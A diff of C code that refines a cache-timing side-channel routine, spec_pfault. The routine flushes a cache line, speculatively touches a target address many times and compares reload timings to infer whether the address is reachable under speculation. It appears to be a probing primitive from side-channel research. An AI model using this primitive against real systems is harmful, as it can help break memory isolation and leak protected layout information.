@@ -3,6 +3,7 @@
 
 /////////////////////////////////////////////////
 
+/* memory for side-channel to work with */
 align_to(64) static blobset BLOBSET = {};
 blob *TEST = &BLOBSET.test, *JUNK = &BLOBSET.junk;
 
@@ -54,24 +55,36 @@ void spec_test(const void* mem, uintptr_t* test) {
 		: "=&r"(tmp1), "=&r"(tmp2)
 		: "r"(mem), "r"(test), "r"(JUNK)); }
 
-uint64_t uint64_min(uint64_t x, uint64_t y) {
-	return x < y ? x : y; }
+void uint64_min(uint64_t* x, uint64_t y) {
+	if (*x > y) *x = y; }
+
+void spec_pfault0(
+    const void* mem, uintptr_t* test,
+    uint64_t* reg, uint64_t* spec)
+{
+	*reg = *spec = ~0;
+	for (size_t j = 0; j < 32; j++) {
+		cache_flush(TEST); mem_read(test);
+		uint64_min(reg, timed_read(test)); }
+
+	for (size_t j = 0; j < 32; j++) {
+		cache_flush(TEST);
+		for (size_t k = 0; k < 256; k++)
+			spec_test(mem, test);
+
+		uint64_min(spec, timed_read(test)); } }
 
 bool spec_pfault(const void* mem) {
 	uintptr_t* test = (uintptr_t*)TEST;
-	uint64_t reg = 0, spec0 = ~0, spec = 0;
+	uint64_t reg0 = ~0, reg = 0,
+	         spec0 = ~0, spec = 0;
 
-	for (size_t i = 0; i < 8; i++) {
-		cache_flush(TEST); mem_read(test);
-		reg += timed_read(test);
+	for (size_t i = 0; i < 32; i++) {
+		spec_pfault0(mem, test, &reg0, &spec0);
+		reg += reg0; spec += spec0;
 
-		for (size_t j = 0; j < 8; j++) {
-			cache_flush(TEST);
-			for (size_t k = 0; k < 256; k++)
-				spec_test(mem, test);
+		if (i >= 8) {
+			if (spec < (reg + reg / 2)) return false;
+			if (spec > 4 * reg) return true; } }
 
-			spec0 = uint64_min(spec0, timed_read(test)); }
-		
-		spec += spec0; spec0 = ~0; }
-
-	return spec > 3 * reg; }
+	return spec > (2 * reg + reg / 2); }
